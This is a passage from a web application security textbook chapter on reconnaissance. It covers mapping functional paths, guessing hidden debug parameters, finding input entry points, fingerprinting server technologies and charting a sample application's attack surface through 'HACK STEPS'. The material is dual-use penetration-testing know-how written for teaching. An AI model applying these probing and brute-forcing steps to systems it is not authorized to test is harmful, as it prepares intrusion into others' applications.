cataloged. This picture is inherited from the pre-application days of the World 
Wide Web, in which web servers functioned as repositories of static information, retrieved using URLs that were effectively fi lenames. To publish some web 
content, an author simply generated a bunch of HTML fi les and copied these 
into the relevant directory on a web server. When users followed hyperlinks, 
c04.indd 93 c04.indd 93 8/19/2011 12:04:44 PM 8/19/2011 12:04:44 PM
Stuttard c04.indd V3 - 07/22/2011 Page 94
94 Chapter 4 n Mapping the Application
they navigated the set of fi les created by the author, requesting each fi le via its 
name within the directory tree residing on the server.
Although the evolution of web applications has fundamentally changed the 
experience of interacting with the web, the picture just described is still applicable to the majority of web application content and functionality. Individual 
functions are typically accessed via a unique URL, which is usually the name 
of the server-side script that implements the function. The parameters to the 
request (residing in either the URL query string or the body of a POST request) 
do not tell the application what function to perform; they tell it what information 
to use when performing it. In this context, the methodology of constructing a 
URL-based map can be effective in cataloging the application‚Äôs functionality.
In applications that use REST-style URLs, parts of the URL fi le path contain 
strings that in fact function as parameter values. In this situation, by mapping URLs, a spider maps both the application functions and the list of known 
parameter values to those functions.
In some applications, however, the picture based on application ‚Äúpages‚Äù 
is inappropriate. Although it may be possible to shoehorn any application‚Äôs 
structure into this form of representation, in many cases a different picture, 
based on functional paths, is far more useful for cataloging its content and 
functionality. Consider an application that is accessed using only requests of 
the following form:
POST /bank.jsp HTTP/1.1
Host: wahh-bank.com
Content-Length: 106
servlet=TransferFunds&method=confirmTransfer&fromAccount=10372918&to
Account=
3910852&amount=291.23&Submit=Ok
Here, every request is made to a single URL. The parameters to the request 
are used to tell the application what function to perform by naming the Java 
servlet and method to invoke. Further parameters provide the information to 
use in performing the function. In the picture based on application pages, the 
application appears to have only a single function, and a URL-based map does 
not elucidate its functionality. However, if we map the application in terms of 
functional paths, we can obtain a much more informative and useful catalog of 
its functionality. Figure 4-10 is a partial map of the functional paths that exist 
within the application.
c04.indd 94 c04.indd 94 8/19/2011 12:04:44 PM 8/19/2011 12:04:44 PM
Stuttard c04.indd V3 - 07/22/2011 Page 95
 Chapter 4 n Mapping the Application 95
Figure 4-10: A mapping of the functional paths within a web application
WahhBank.
login
WahhBank.
home
TransferFunds.
selectAccounts
BillPayment.
addPayee
BillPayment.
selectPayee
TransferFunds.
enterAmount
BillPayment.
enterAmount
TransferFunds.
confirmTransfer
BillPayment.
confirmPayment
WahhBank.
logout
Representing an application‚Äôs functionality in this way is often more useful 
even in cases where the usual picture based on application pages can be applied 
without any problems. The logical relationships and dependencies between 
different functions may not correspond to the directory structure used within 
URLs. It is these logical relationships that are of most interest to you, both in 
understanding the application‚Äôs core functionality and in formulating possible 
attacks against it. By identifying these, you can better understand the expectations and assumptions of the application‚Äôs developers when implementing 
the functions. You also can attempt to fi nd ways to violate these assumptions, 
causing unexpected behavior within the application.
In applications where functions are identifi ed using a request parameter, rather 
than the URL, this has implications for the enumeration of application content. 
In the previous example, the content discovery exercises described so far are 
unlikely to uncover any hidden content. Those techniques need to be adapted 
to the mechanisms actually used by the application to access functionality.
c04.indd 95 c04.indd 95 8/19/2011 12:04:44 PM 8/19/2011 12:04:44 PM
Stuttard c04.indd V3 - 07/22/2011 Page 96
96 Chapter 4 n Mapping the Application
HACK STEPS
 1. Identify any instances where application functionality is accessed not by 
requesting a specific page for that function (such as /admin/editUser.jsp)
but by passing the name of a function in a parameter (such as 
/admin.jsp?action=editUser).
 2. Modify the automated techniques described for discovering URL-specified 
content to work on the content-access mechanisms in use within the 
application. For example, if the application uses parameters that specify servlet and method names, first determine its behavior when an 
invalid servlet and/or method is requested, and when a valid method is 
requested with other invalid parameters. Try to identify attributes of the 
server‚Äôs responses that indicate ‚Äúhits‚Äù ‚Äî valid servlets and methods. If 
possible, find a way of attacking the problem in two stages, first enumerating servlets and then methods within these. Using a method similar to 
the one used for URL-specified content, compile lists of common items, 
add to these by inferring from the names actually observed, and generate 
large numbers of requests based on these.
 3. If applicable, compile a map of application content based on functional 
paths, showing all the enumerated functions and the logical paths and 
dependencies between them.
Discovering Hidden Parameters
A variation on the situation where an application uses request parameters to 
specify which function should be performed arises where other parameters 
are used to control the application‚Äôs logic in signifi cant ways. For example, an 
application may behave differently if the parameter debug=true is added to the 
query string of any URL. It might turn off certain input validation checks, allow 
the user to bypass certain access controls, or display verbose debug information in its response. In many cases, the fact that the application handles this 
parameter cannot be directly inferred from any of its content (for example, it 
does not include debug=false in the URLs it publishes as hyperlinks). The effect 
of the parameter can only be detected by guessing a range of values until the 
correct one is submitted.
c04.indd 96 c04.indd 96 8/19/2011 12:04:44 PM 8/19/2011 12:04:44 PM
Stuttard c04.indd V3 - 07/22/2011 Page 97
 Chapter 4 n Mapping the Application 97
HACK STEPS
 1. Using lists of common debug parameter names (debug, test, hide, source, 
etc.) and common values (true, yes, on, 1, etc.), make a large number of 
requests to a known application page or function, iterating through all 
permutations of name and value. For POST requests, insert the added 
parameter to both the URL query string and the message body.
Burp Intruder can be used to perform this test using multiple payload 
sets and the ‚Äúcluster bomb‚Äù attack type (see Chapter 14 for more details).
 2. Monitor all responses received to identify any anomalies that may indicate 
that the added parameter has had an effect on the application‚Äôs processing.
 3. Depending on the time available, target a number of different pages or 
functions for hidden parameter discovery. Choose functions where it is 
most likely that developers have implemented debug logic, such as login, 
search, and file uploading and downloading.
Analyzing the Application
Enumerating as much of the application‚Äôs content as possible is only one element of the mapping process. Equally important is the task of analyzing the 
application‚Äôs functionality, behavior, and technologies employed to identify the 
key attack surfaces it exposes and to begin formulating an approach to probing 
the application for exploitable vulnerabilities.
Here are some key areas to investigate:
n The application‚Äôs core functionality ‚Äî the actions that can be leveraged 
to perform when used as intended
n Other, more peripheral application behavior, including off-site links, error 
messages, administrative and logging functions, and the use of redirects
n The core security mechanisms and how they function ‚Äî in particular, 
management of session state, access controls, and authentication mechanisms and supporting logic (user registration, password change, and 
account recovery)
c04.indd 97 c04.indd 97 8/19/2011 12:04:44 PM 8/19/2011 12:04:44 PM
Stuttard c04.indd V3 - 07/22/2011 Page 98
98 Chapter 4 n Mapping the Application
n All the different locations at which the application processes user-supplied 
input ‚Äî every URL, query string parameter, item of POST data, and cookie
n The technologies employed on the client side, including forms, clientside scripts, thick-client components (Java applets, ActiveX controls, and 
Flash), and cookies
n The technologies employed on the server side, including static and dynamic 
pages, the types of request parameters employed, the use of SSL, web 
server software, interaction with databases, e-mail systems, and other 
back-end components
n Any other details that may be gleaned about the internal structure and 
functionality of the server-side application ‚Äî the mechanisms it uses 
behind the scenes to deliver the functionality and behavior that are visible from the client perspective
Identifying Entry Points for User Input
The majority of ways in which the application captures user input for serverside processing should be obvious when reviewing the HTTP requests that are 
generated as you walk through the application‚Äôs functionality. Here are the key 
locations to pay attention to:
n Every URL string up to the query string marker
n Every parameter submitted within the URL query string
n Every parameter submitted within the body of a POST request
n Every cookie
n Every other HTTP header that the application might process ‚Äî in particular, the User-Agent, Referer, Accept, Accept-Language, and Host headers
URL File Paths
The parts of the URL that precede the query string are often overlooked as entry 
points, since they are assumed to be simply the names of directories and fi les 
on the server fi le system. However, in applications that use REST-style URLs, 
the parts of the URL that precede the query string can in fact function as data 
parameters and are just as important as entry points for user input as the query 
string itself.
A typical REST-style URL could have this format:
http://eis/shop/browse/electronics/iPhone3G/
c04.indd 98 c04.indd 98 8/19/2011 12:04:44 PM 8/19/2011 12:04:44 PM
Stuttard c04.indd V3 - 07/22/2011 Page 99
 Chapter 4 n Mapping the Application 99
In this example, the strings electronics and iPhone3G should be treated as 
parameters to store a search function.
Similarly, in this URL:
http://eis/updates/2010/12/25/my-new-iphone/
each of the URL components following updates may be being handled in a 
RESTful manner.
Most applications using REST-style URLs are easy to identify given the URL 
structure and application context. However, no hard-and-fast rules should be 
assumed when mapping an application, because it is up to the application‚Äôs 
authors how users should interact with it.
Request Parameters
Parameters submitted within the URL query string, message body, and HTTP 
cookies are the most obvious entry points for user input. However, some applications do not employ the standard name=value format for these parameters. 
They may employ their own custom scheme, which may use nonstandard query 
string markers and fi eld separators, or they may embed other data schemes such 
as XML within parameter data.
Here are some examples of nonstandard parameter formats that the authors 
have encountered in the wild:
n /dir/file;foo=bar&foo2=bar2
n /dir/file?foo=bar$foo2=bar2
n /dir/file/foo%3dbar%26foo2%3dbar2
n /dir/foo.bar/file
n /dir/foo=bar/file
n /dir/file?param=foo:bar
n /dir/file?data=%3cfoo%3ebar%3c%2ffoo%3e%3cfoo2%3ebar2%3c%2ffoo2%3e
If a nonstandard parameter format is being used, you need to take this into 
account when probing the application for all kinds of common vulnerabilities. 
For example, suppose that, when testing the fi nal URL in this list, you ignore the 
custom format and simply treat the query string as containing a single parameter 
called data, and therefore submit various kinds of attack payloads as the value 
of this parameter. You would miss many kinds of vulnerabilities that may exist 
in the processing of the query string. Conversely, if you dissect the format and 
place your payloads within the embedded XML data fi elds, you may immediately 
discover a critical bug such as SQL injection or path traversal.
c04.indd 99 c04.indd 99 8/19/2011 12:04:44 PM 8/19/2011 12:04:44 PM
Stuttard c04.indd V3 - 07/22/2011 Page 100
100 Chapter 4 n Mapping the Application
HTTP Headers
Many applications perform custom logging functions and may log the contents 
of HTTP headers such as Referer and User-Agent. These headers should always 
be considered as possible entry points for input-based attacks.
Some applications perform additional processing on the Referer header. For 
example, an application may detect that a user has arrived via a search engine, 
and seek to provide a customized response tailored to the user‚Äôs search query. 
The application may echo the search term or may attempt to highlight matching 
expressions within the response. Some applications seek to boost their search 
rankings by dynamically adding content such as HTML keywords, containing 
strings that recent visitors from search engines have been searching for. In this 
situation, it may be possible to persistently inject content into the application‚Äôs 
responses by making a request numerous times containing a suitably crafted 
Referer URL.
An important trend in recent years has been for applications to present different content to users who access the application via different devices (laptop, 
cell phone, tablet). This is achieved by inspecting the User-Agent header. As well 
as providing an avenue for input-based attacks directly within the User-Agent
header itself, this behavior provides an opportunity to uncover an additional 
attack surface within the application. By spoofi ng the User-Agent header for 
a popular mobile device, you may be able to access a simplifi ed user interface 
that behaves differently than the primary interface. Since this interface is generated via different code paths within the server-side application, and may have 
been subjected to less security testing, you may identify bugs such as cross-site 
scripting that do not exist in the primary application interface.
TIP Burp Intruder contains a built-in payload list containing a large number 
of user agent strings for different types of devices. You can carry out a simple 
attack that performs a GET request to the main application page supplying 
different user agent strings and then review the intruder results to identify 
anomalies that suggest a different user interface is being presented.
In addition to targeting HTTP request headers that your browser sends by 
default, or that application components add, in some situations you can perform successful attacks by adding further headers that the application may 
still process. For example, many applications perform some processing on the 
client‚Äôs IP address to carry out functions such as logging, access control, or 
user geolocation. The IP address of the client‚Äôs network connection typically 
is available to applications via platform APIs. However, to handle cases where 
the application resides behind a load balancer or proxy, applications may use 
the IP address specifi ed in the X-Forwarded-For request header if it is present. 
Developers may then mistakenly assume that the IP address value is untainted 
and process it in dangerous ways. By adding a suitably crafted X-Forwarded-For
c04.indd 100 c04.indd 100 8/19/2011 12:04:45 PM 8/19/2011 12:04:45 PM
Stuttard c04.indd V3 - 07/22/2011 Page 101
 Chapter 4 n Mapping the Application 101
header, you may be able to deliver attacks such as SQL injection or persistent 
cross-site scripting.
Out-of-Band Channels
A fi nal class of entry points for user input includes any out-of-band channel 
by which the application receives data that you may be able to control. Some 
of these entry points may be entirely undetectable if you simply inspect the 
HTTP traffi c generated by the application, and fi nding them usually requires 
an understanding of the wider context of the functionality that the application 
implements. Here are some examples of web applications that receive usercontrollable data via an out-of-band channel:
n A web mail application that processes and renders e-mail messages received 
via SMTP
n A publishing application that contains a function to retrieve content via 
HTTP from another server
n An intrusion detection application that gathers data using a network 
sniffer and presents this using a web application interface
n Any kind of application that provides an API interface for use by nonbrowser user agents, such as cell phone apps, if the data processed via 
this interface is shared with the primary web application
Identifying Server-Side Technologies
Normally it is possible to fi ngerprint the technologies employed on the server 
via various clues and indicators.
Banner Grabbing
Many web servers disclose fi ne-grained version information, both about the 
web server software itself and about other components that have been installed. 
For example, the HTTP Server header discloses a huge amount of detail about 
some installations:
Server: Apache/1.3.31 (Unix) mod_gzip/1.3.26.1a mod_auth_passthrough/
1.8 mod_log_bytes/1.2 mod_bwlimited/1.4 PHP/4.3.9 FrontPage/
5.0.2.2634a mod_ssl/2.8.20 OpenSSL/0.9.7a
In addition to the Server header, the type and version of software may be disclosed in other locations:
n Templates used to build HTML pages
n Custom HTTP headers
n URL query string parameters
c04.indd 101 c04.indd 101 8/19/2011 12:04:45 PM 8/19/2011 12:04:45 PM
Stuttard c04.indd V3 - 07/22/2011 Page 102
102 Chapter 4 n Mapping the Application
HTTP Fingerprinting
In principle, any item of information returned by the server may be customized 
or even deliberately falsifi ed, and banners like the Server header are no exception. Most application server software allows the administrator to confi gure the 
banner returned in the Server HTTP header. Despite measures such as this, it is 
usually possible for a determined attacker to use other aspects of the web server‚Äôs 
behavior to determine the software in use, or at least narrow down the range of 
possibilities. The HTTP specifi cation contains a lot of detail that is optional or left 
to an implementer‚Äôs discretion. Also, many web servers deviate from or extend 
the specifi cation in various ways. As a result, a web server can be fi ngerprinted 
in numerous subtle ways, other than via its Server banner. Httprecon is a handy 
tool that performs a number of tests in an attempt to fi ngerprint a web server‚Äôs 
software. Figure 4-11 shows Httprecon running against the EIS application and 
reporting various possible web servers with different degrees of confi dence.
Figure 4-11: Httprecon fingerprinting the EIS application
File Extensions
File extensions used within URLs often disclose the platform or programming 
language used to implement the relevant functionality. For example:
n asp ‚Äî Microsoft Active Server Pages
n aspx ‚Äî Microsoft ASP.NET
c04.indd 102 c04.indd 102 8/19/2011 12:04:45 PM 8/19/2011 12:04:45 PM
Stuttard c04.indd V3 - 07/22/2011 Page 103
 Chapter 4 n Mapping the Application 103
n jsp ‚Äî Java Server Pages
n cfm ‚Äî Cold Fusion
n php ‚Äî The PHP language
n d2w ‚Äî WebSphere
n pl ‚Äî The Perl language
n py ‚Äî The Python language
n dll ‚Äî Usually compiled native code (C or C++)
n nsf or ntf ‚Äî Lotus Domino
Even if an application does not employ a particular fi le extension in its published 
content, it is usually possible to verify whether the technology supporting that 
extension is implemented on the server. For example, if ASP.NET is installed, 
requesting a nonexistent .aspx fi le returns a customized error page generated 
by the ASP.NET framework, as shown in Figure 4-12. Requesting a nonexistent 
fi le with a different extension returns a generic error message generated by the 
web server, as shown in Figure 4-13.
Figure 4-12: A customized error page indicating that the ASP.NET platform is present on 
the server
Using the automated content discovery techniques already described, it 
is possible to request a large number of common fi le extensions and quickly 
confi rm whether any of the associated technologies are implemented on the 
server.
The divergent behavior described arises because many web servers map 
specifi c fi le extensions to particular server-side components. Each different 
component may handle errors (including requests for nonexistent content) differently. Figure 4-14 shows the various extensions that are mapped to different 
handler DLLs in a default installation of IIS 5.0.
c04.indd 103 c04.indd 103 8/19/2011 12:04:45 PM 8/19/2011 12:04:45 PM
Stuttard c04.indd V3 - 07/22/2011 Page 104
104 Chapter 4 n Mapping the Application
Figure 4-13: A generic error message created when an unrecognized file extension is 
requested
Figure 4-14: File extension mappings in IIS 5.0
It is possible to detect the presence of each fi le extension mapping via the 
different error messages generated when that fi le extension is requested. In 
some cases, discovering a particular mapping may indicate the presence of a 
web server vulnerability. For example, the .printer and .ida/.idq handlers 
in IIS have in the past been found vulnerable to buffer overfl ow vulnerabilities.
Another common fi ngerprint to be aware of are URLs that look like this:
https://wahh-app/news/0,,2-421206,00.html
c04.indd 104 c04.indd 104 8/19/2011 12:04:45 PM 8/19/2011 12:04:45 PM
Stuttard c04.indd V3 - 07/22/2011 Page 105
 Chapter 4 n Mapping the Application 105
The comma-separated numbers toward the end of the URL are usually generated by the Vignette content management platform.
Directory Names
It is common to encounter subdirectory names that indicate the presence of an 
associated technology. For example:
n servlet ‚Äî Java servlets
n pls ‚Äî Oracle Application Server PL/SQL gateway
n cfdocs or cfide ‚Äî Cold Fusion
n SilverStream ‚Äî The SilverStream web server
n WebObjects or {function}.woa ‚Äî Apple WebObjects
n rails ‚Äî Ruby on Rails
Session Tokens
Many web servers and web application platforms generate session tokens by default 
with names that provide information about the technology in use. For example:
n JSESSIONID ‚Äî The Java Platform
n ASPSESSIONID ‚Äî Microsoft IIS server
n ASP.NET_SessionId ‚Äî Microsoft ASP.NET
n CFID/CFTOKEN ‚Äî Cold Fusion
n PHPSESSID ‚Äî PHP
Third-Party Code Components
Many web applications incorporate third-party code components to implement 
common functionality such as shopping carts, login mechanisms, and message 
boards. These may be open source or may have been purchased from an external 
software developer. When this is the case, the same components often appear 
within numerous other web applications on the Internet, which you can inspect to 
understand how the component functions. Often, other applications use different 
features of the same component, enabling you to identify additional behavior and 
functionality beyond what is directly visible in the target application. Also, the 
software may contain known vulnerabilities that have been discussed elsewhere, 
or you may be able to download and install the component yourself and perform 
a source code review or probe it for defects in a controlled way.
c04.indd 105 c04.indd 105 8/19/2011 12:04:45 PM 8/19/2011 12:04:45 PM
Stuttard c04.indd V3 - 07/22/2011 Page 106
106 Chapter 4 n Mapping the Application
HACK STEPS
 1. Identify all entry points for user input, including URLs, query string parameters, POST data, cookies, and other HTTP headers processed by the 
application.
 2. Examine the query string format used by the application. If it does not 
employ the standard format described in Chapter 3, try to understand 
how parameters are being transmitted via the URL. Virtually all custom 
schemes still employ some variation on the name/value model, so try to 
understand how name/value pairs are being encapsulated into the nonstandard URLs you have identified.
 3. Identify any out-of-bound channels via which user-controllable or other 
third-party data is being introduced into the application‚Äôs processing.
 4. View the HTTP Server banner returned by the application. Note that in 
some cases, different areas of the application are handled by different 
back-end components, so different Server headers may be received.
 6. Check for any other software identifiers contained within any custom 
HTTP headers or HTML source code comments.
 7. Run the httprint tool to fingerprint the web server.
 8. If fine-grained information is obtained about the web server and other 
components, research the software versions in use to identify any vulnerabilities that may be exploited to advance an attack (see Chapter 18).
 9. Review your map of application URLs to identify any interesting-looking 
file extensions, directories, or other sub-sequences that may provide clues 
about the technologies in use on the server.
 10. Review the names of all session tokens issued by the application to identify the technologies being used.
 11. Use lists of common technologies, or Google, to establish which technologies may be in use on the server, or discover other websites and applications that appear to employ the same technologies.
 12. Perform searches on Google for the names of any unusual cookies, 
scripts, HTTP headers, and the like that may belong to third-party software 
components. If you locate other applications in which the same components are being used, review these to identify any additional functionality 
and parameters that the components support, and verify whether these 
are also present in your target application. Note that third-party components may look and feel quite different in each implementation, due to 
branding customizations, but the core functionality, including script and 
parameter names, is often the same. If possible, download and install the 
component and analyze it to fully understand its capabilities and, if possible, discover any vulnerabilities. Consult repositories of known vulnerabilities to identify any known defects with the component in question.
c04.indd 106 c04.indd 106 8/19/2011 12:04:46 PM 8/19/2011 12:04:46 PM
Stuttard c04.indd V3 - 07/22/2011 Page 107
 Chapter 4 n Mapping the Application 107
Identifying Server-Side Functionality
It is often possible to infer a great deal about server-side functionality and structure, or at least make an educated guess, by observing clues that the application 
discloses to the client.
Dissecting Requests
Consider the following URL, which is used to access a search function:
https://wahh-app.com/calendar.jsp?name=new%20applicants&isExpired=
0&startDate=22%2F09%2F2010&endDate=22%2F03%2F2011&OrderBy=name
As you have seen, the .jsp fi le extension indicates that Java Server Pages are 
in use. You may guess that a search function will retrieve its information from 
either an indexing system or a database. The presence of the OrderBy parameter 
suggests that a back-end database is being used and that the value you submit 
may be used as the ORDER BY clause of a SQL query. This parameter may well 
be vulnerable to SQL injection, as may any of the other parameters if they are 
used in database queries (see Chapter 9).
Also of interest among the other parameters is the isExpired fi eld. This 
appears to be a Boolean fl ag specifying whether the search query should include 
expired content. If the application designers did not expect ordinary users to 
be able retrieve any expired content, changing this parameter from 0 to 1 could 
identify an access control vulnerability (see Chapter 8).
The following URL, which allows users to access a content management 
system, contains a different set of clues:
https://wahh-app.com/workbench.aspx?template=NewBranch.tpl&loc=
/default&ver=2.31&edit=false
Here, the .aspx fi le extension indicates that this is an ASP.NET application. It also 
appears highly likely that the template parameter is used to specify a fi lename, 
and the loc parameter is used to specify a directory. The possible fi le extension 
.tpl appears to confi rm this, as does the location /default, which could very 
well be a directory name. It is possible that the application retrieves the template 
fi le specifi ed and includes the contents in its response. These parameters may 
well be vulnerable to path traversal attacks, allowing arbitrary fi les to be read 
from the server (see Chapter 10).
Also of interest is the edit parameter, which is set to false. It may be that 
changing this value to true will modify the registration functionality, potentially enabling an attacker to edit items that the application developer did not 
intend to be editable. The ver parameter does not have any readily guessable 
purpose, but it may be that modifying this will cause the application to perform 
a different set of functions that an attacker could exploit.
c04.indd 107 c04.indd 107 8/19/2011 12:04:46 PM 8/19/2011 12:04:46 PM
Stuttard c04.indd V3 - 07/22/2011 Page 108
108 Chapter 4 n Mapping the Application
Finally, consider the following request, which is used to submit a question 
to application administrators:
POST /feedback.php HTTP/1.1
Host: wahh-app.com
Content-Length: 389
from=user@wahh-mail.com&to=helpdesk@wahh-app.com&subject=
Problem+logging+in&message=Please+help...
As with the other examples, the .php fi le extension indicates that the function 
is implemented using the PHP language. Also, it is extremely likely that the 
application is interfacing with an external e-mail system, and it appears that 
user-controllable input is being passed to that system in all relevant fi elds of 
the e-mail. The function may be exploitable to send arbitrary messages to any 
recipient, and any of the fi elds may also be vulnerable to e-mail header injection (see Chapter 10).
TIP It is often necessary to consider the whole URL and application context 
to guess the function of different parts of a request. Recall the following URL 
from the Extreme Internet Shopping application:
http://eis/pub/media/117/view
The handling of this URL is probably functionally equivalent to the 
following:
http://eis/manager?schema=pub&type=media&id=117&action=view
While it isn‚Äôt certain, it seems likely that resource 117 is contained in the 
collection of resources media and that the application is performing an action 
on this resource that is equivalent to view. Inspecting other URLs would help 
confi rm this.
The fi rst consideration would be to change the action from view to a possible alternative, such as edit or add. However, if you change it to add and this 
guess is right, it would likely correspond to an attempt to add a resource with 
an id of 117. This will probably fail, since there is already a resource with an 
id of 117. The best approach would be to look for an add operation with an 
id value higher than the highest observed value or to select an arbitrary high 
value. For example, you could request the following:
http://eis/pub/media/7337/add
It may also be worthwhile to look for other data collections by altering 
media while keeping a similar URL structure:
http://eis/pub/pages/1/view
http://eis/pub/users/1/view
c04.indd 108 c04.indd 108 8/19/2011 12:04:46 PM 8/19/2011 12:04:46 PM
Stuttard c04.indd V3 - 07/22/2011 Page 109
 Chapter 4 n Mapping the Application 109
HACK STEPS
 1. Review the names and values of all parameters being submitted to the 
application in the context of the functionality they support.
 2. Try to think like a programmer, and imagine what server-side mechanisms 
and technologies are likely to have been used to implement the behavior 
you can observe.
Extrapolating Application Behavior
Often, an application behaves consistently across the range of its functionality. 
This may be because different functions were written by the same developer 
or to the same design specifi cation, or share some common code components. 
In this situation, it may be possible to draw conclusions about server-side functionality in one area and extrapolate these to another area.
For example, the application may enforce some global input validation checks, 
such as sanitizing various kinds of potentially malicious input before it is processed. Having identifi ed a blind SQL injection vulnerability, you may encounter 
problems exploiting it, because your crafted requests are being modifi ed in 
unseen ways by the input validation logic. However, other functions within the 
application might provide good feedback about the kind of sanitization being 
performed ‚Äî for example, a function that echoes some user-supplied data to 
the browser. You may be able to use this function to test different encodings and 
variations of your SQL injection payload to determine what raw input must be 
submitted to achieve the desired attack string after the input validation logic 
has been applied. If you are lucky, the validation works in the same way across 
the application, enabling you to exploit the injection fl aw.
Some applications use custom obfuscation schemes when storing sensitive 
data on the client to prevent casual inspection and modifi cation of this data 
by users (see Chapter 5). Some such schemes may be extremely diffi cult to 
decipher given access to only a sample of obfuscated data. However, there may 
be functions within the application where a user can supply an obfuscated 
string and retrieve the original. For example, an error message may include the 
deobfuscated data that led to the error. If the same obfuscation scheme is used 
throughout the application, it may be possible to take an obfuscated string from 
one location (such as a cookie) and feed it into the other function to decipher its 
meaning. It may also be possible to reverse-engineer the obfuscation scheme by 
submitting systematically varying values to the function and monitoring their 
deobfuscated equivalents.
Finally, errors are often handled inconsistently within the application. Some 
areas trap and handle errors gracefully, and other areas simply crash and return 
c04.indd 109 c04.indd 109 8/19/2011 12:04:46 PM 8/19/2011 12:04:46 PM
Stuttard c04.indd V3 - 07/22/2011 Page 110
110 Chapter 4 n Mapping the Application
verbose debugging information to the user (see Chapter 15). In this situation, 
it may be possible to gather information from the error messages returned in 
one area and apply it to other areas where errors are handled gracefully. For 
example, by manipulating request parameters in systematic ways and monitoring the error messages received, it may be possible to determine the internal 
structure and logic of the application component. If you are lucky, aspects of 
this structure may be replicated in other areas.
HACK STEPS
 1. Try to identify any locations within the application that may contain clues 
about the internal structure and functionality of other areas.
 2. It may not be possible to draw any firm conclusions here; however, the 
cases identified may prove useful at a later stage of the attack when 
you‚Äôre attempting to exploit any potential vulnerabilities.
Isolating Unique Application Behavior
Sometimes the situation is the opposite of that just described. In many wellsecured or mature applications, a consistent framework is employed that prevents numerous types of attacks, such as cross-site scripting, SQL injection, 
and unauthorized access. In these cases, the most fruitful areas for hunting 
vulnerabilities generally are the portions of the application that have been added 
retrospectively, or ‚Äúbolted on,‚Äù and hence are not handled by the application‚Äôs 
general security framework. Additionally, they may not be correctly tied into 
the application through authentication, session management, and access control. 
These are often identifi able through differences in GUI appearance, parameter 
naming conventions, or explicitly through comments in source code.
HACK STEPS
 1. Make a note of any functionality that diverges from the standard GUI 
appearance, parameter naming, or navigation mechanism used within the 
rest of the application.
 2. Also make a note of functionality that is likely to have been added retrospectively. Examples include debug functions, CAPTCHA controls, usage 
tracking, and third-party code.
 3. Perform a full review of these areas, and do not assume that the standard 
defenses used elsewhere in the application apply.
c04.indd 110 c04.indd 110 8/19/2011 12:04:46 PM 8/19/2011 12:04:46 PM
Stuttard c04.indd V3 - 07/22/2011 Page 111
 Chapter 4 n Mapping the Application 111
Mapping the Attack Surface
The fi nal stage of the mapping process is to identify the various attack surfaces 
exposed by the application and the potential vulnerabilities that are commonly 
associated with each one. The following is a rough guide to some key types 
of behavior and functionality that you may identify, and the kinds of vulnerabilities that are most commonly found within each one. The remainder of this 
book is concerned with the practical details of how you can detect and exploit 
each of these problems:
n Client-side validation ‚Äî Checks may not be replicated on the server
n Database interaction ‚Äî SQL injection
n File uploading and downloading ‚Äî Path traversal vulnerabilities, stored 
cross-site scripting
n Display of user-supplied data ‚Äî Cross-site scripting
n Dynamic redirects ‚Äî Redirection and header injection attacks
n Social networking features ‚Äî username enumeration, stored cross-site 
scripting
n Login ‚Äî Username enumeration, weak passwords, ability to use brute 
force
n Multistage login ‚Äî Logic fl aws
n Session state ‚Äî Predictable tokens, insecure handling of tokens
n Access controls ‚Äî Horizontal and vertical privilege escalation
n User impersonation functions ‚Äî Privilege escalation
n Use of cleartext communications ‚Äî Session hijacking, capture of credentials and other sensitive data
n Off-site links ‚Äî Leakage of query string parameters in the Referer
header
n Interfaces to external systems ‚Äî Shortcuts in the handling of sessions 
and/or access controls
n Error messages ‚Äî Information leakage
n E-mail interaction ‚Äî E-mail and/or command injection
n Native code components or interaction ‚Äî Buffer overfl ows
n Use of third-party application components ‚Äî Known vulnerabilities
n Identifi able web server software ‚Äî Common confi guration weaknesses, 
known software bugs
c04.indd 111 c04.indd 111 8/19/2011 12:04:46 PM 8/19/2011 12:04:46 PM
Stuttard c04.indd V3 - 07/22/2011 Page 112
112 Chapter 4 n Mapping the Application
Mapping the Extreme Internet Shopping Application
Having mapped the content and functionality of the EIS application, many paths 
could be followed to attack the application, as shown in Figure 4-15.
Figure 4-15: The attack surface exposed by the EIS application
The /auth directory contains authentication functionality. A full review of 
all authentication functions, session handling, and access control is worthwhile, 
including further content discovery attacks.
Within the /core path, the sitestats page appears to accept an array of parameters delimited by the pipe character (|). As well as conventional input-based 
attacks, other values could be brute-forcible, such as source, location, and 
IP, in an attempt to reveal more information about other users or about the 
page specifi ed in pageID. It may also be possible to fi nd out information about 
c04.indd 112 c04.indd 112 8/19/2011 12:04:46 PM 8/19/2011 12:04:46 PM
Stuttard c04.indd V3 - 07/22/2011 Page 113
 Chapter 4 n Mapping the Application 113
inaccessible resources or to try a wildcard option in pageID, such as pageID=all
or pageID=*. Finally, because the observed pageID value contains a slash, it may 
indicate a resource being retrieved from the fi le system, in which case path 
traversal attacks may be a possibility.
The /gb path contains the site‚Äôs guestbook. Visiting this page suggests it is 
used as a discussion forum, moderated by an administrator. Messages are moderated, but the login bypass login=true means that an attacker can attempt to 
approve malicious messages (to deliver cross-site scripting attacks, for example) 
and read other users‚Äô private messages to the administrator.
The /home path appears to hold authenticated user content. This could make 
a good basis for attempts to launch a horizontal privilege escalation attack to 
access another user‚Äôs personal information and to ensure that access controls 
are present and enforced on every page.
A quick review shows that the /icons and /images paths hold static content. 
It may be worth brute-forcing for icon names that could indicate third-party 
software, and checking for directory indexing on these directories, but they are 
unlikely to be worth signifi cant effort.
The /pub path contains REST-style resources under /pub/media and /pub/
user. A brute-force attack could be used to fi nd the profi le pages of other application users by targeting the numeric value in /pub/user/11. Social networking 
functionality such as this can reveal user information, usernames, and other 
users‚Äô logon status.
The /shop path contains the online shopping site and has a large number of 
URLs. However, they all have a similar structure, and an attacker could probably 
probe all of the relevant attack surface by looking at just one or two items. The 
purchasing process may contain interesting logic fl aws that could be exploited 
to obtain unauthorized discounts or avoid payment.
HACK STEPS
 1. Understand the core functionality implemented within the application and 
the main security mechanisms in use.
 2. Identify all features of the application‚Äôs functionality and behavior that 
are often associated with common vulnerabilities.
 3. Check any third-party code against public vulnerability databases such as 
www.osvdb.org to determine any known issues.
 4. Formulate a plan of attack, prioritizing the most interesting-looking functionality and the most serious of the associated potential vulnerabilities.
c04.indd 113 c04.indd 113 8/19/2011 12:04:46 PM 8/19/2011 12:04:46 PM
Stuttard c04.indd V3 - 07/22/2011 Page 114
114 Chapter 4 n Mapping the Application
Summary
Mapping the application is a key prerequisite to attacking it. It may be tempting 
to dive in and start probing for bugs, but taking time to gain a sound understanding of the application‚Äôs functionality, technologies, and attack surface will 
pay dividends down the line.
As with almost all of web application hacking, the most effective approach 
is to use manual techniques supplemented where appropriate by controlled 
automation. No fully automated tool can carry out a thorough mapping of the 
application in a safe way. To do this, you need to use your hands and draw on 
